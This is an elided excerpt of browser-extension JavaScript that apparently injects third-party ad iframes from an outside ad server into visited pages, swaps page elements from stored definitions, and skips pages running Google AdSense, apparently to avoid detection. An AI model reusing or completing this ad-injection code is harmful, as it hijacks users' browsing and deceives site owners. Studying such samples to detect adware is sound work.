...
pluginnetwork.contentscript = (function () {
  return {
    ...
    createIframe: function (id, zone, height, width) {
      ...
      ifr.setAttribute(
        'src',
        'http://www.iicdn.com/www/delivery/afr.php?zoneid=' +
          zone +
          '&refresh=60' +
          runstr,
      )
    ...
    contentEdit: function () {
      var swapDefObj = {
        'www.example.com': [
          ...
          { selector: '#example_id', append: false, style: '', ielement: 1 },
        ],
      }
      for (i in document.getElementsByTagName('script')) {
        if (
          typeof document.getElementsByTagName('script')[i].src !== 'undefined'
        ) {
          if (
            document
              .getElementsByTagName('script')
              [i].src.indexOf('pagead/show_ads.js') !== -1
          ) {
            // avoid adsense.... all bow before the big G
            return // exit early
          }
        }
      }
      if (this.isMarketingEnabled()) {
        if (
          ...
          if (
            pluginnetwork.helpers.IsJsonString(
              pluginnetwork.pluginStorage.getItem(
                pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.definitions',
              ),
            )
          ) {
            swapDefObj = JSON.parse(
              pluginnetwork.pluginStorage.getItem(
                pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.definitions',
              ),
            )
        ...
        var td = pluginnetwork.pluginStorage.getItem(
        ...
        var ei = pluginnetwork.pluginStorage.getItem(
        ...
        var ft = pluginnetwork.pluginStorage.getItem(
          pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft',
        )
        if (ft == null) {
        ...
        if (aq > 0) {
          ...
          if (tta == true) {
            ...
            pluginnetwork.pluginStorage.setItem(
              pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq',
              aq,
            )
            pluginnetwork.pluginStorage.setItem(
...
document.addEventListener(
  'DOMNodeInserted',
  pluginnetwork.contentscript.contentUpdate,
  false,
)
